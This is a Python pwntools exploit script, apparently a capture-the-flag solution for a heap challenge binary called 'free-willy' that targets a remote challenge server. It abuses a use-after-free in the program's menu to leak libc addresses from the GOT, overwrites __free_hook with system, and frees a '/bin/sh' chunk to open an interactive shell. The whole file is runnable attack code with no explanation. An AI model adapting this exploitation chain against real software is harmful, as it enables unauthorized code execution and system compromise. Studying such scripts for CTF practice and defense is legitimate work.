#!/usr/bin/python3

from pwn import *

context.terminal = 'tmux split -h'.split(' ')
context.arch = 'amd64'
# context.log_level = 'debug'

elf = ELF('free-willy')

if args.REMOTE:
    p = remote('jh2i.com', 50021)
    libc = ELF('libc.so')
else:
    p = process(elf.path)
    libc = elf.libc

    if args.GDB:
        gdb.attach(p, '''
            break * 0x400e10
            continue
            ''')

def choose(choice):
    p.sendlineafter(b'> ', choice)

def adopt(name):
    choose(b'adopt')
    p.sendlineafter(b'whale?\n', name)

def disown(index):
    choose(b'disown')
    p.sendlineafter(b'away?\n', str(index).encode())

def rename(index, name):
    choose(b'name')
    p.sendlineafter(b'rename?\n', str(index).encode())
    p.sendlineafter(b'name?\n', name)

def observe(index):
    choose(b'observe')
    p.sendlineafter(b'observe?\n', str(index).encode())

# First chunk

adopt(b'A' * 0x8)

disown(0)

# Change leak libc addresses
## Leak puts address

adopt(b'B' * 0x8 + p64(elf.got.puts))

observe(0)

p.recvuntil(b'lil ')

puts_addr = u64(p.recv(6).ljust(8, b'\x00'))

log.info(f'puts @ {hex(puts_addr)}')

## Leak printf address

rename(1, b'B' * 0x8 + p64(elf.got.printf))

observe(0)

p.recvuntil(b'lil ')
printf_addr = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = printf_addr - libc.sym.printf

log.info(f'printf @ {hex(printf_addr)}')
log.info(f'libc @ {hex(libc.address)}')
log.info(f'system @ {hex(libc.sym.system)}')

# Overwrite free.got with system

rename(1, b'B' * 0x8 + p64(libc.sym.__free_hook))

rename(0, p64(libc.sym.system))

# Execute system(b'/bin/sh\x00')

adopt(b'/bin/sh\x00')

disown(2)

p.interactive()
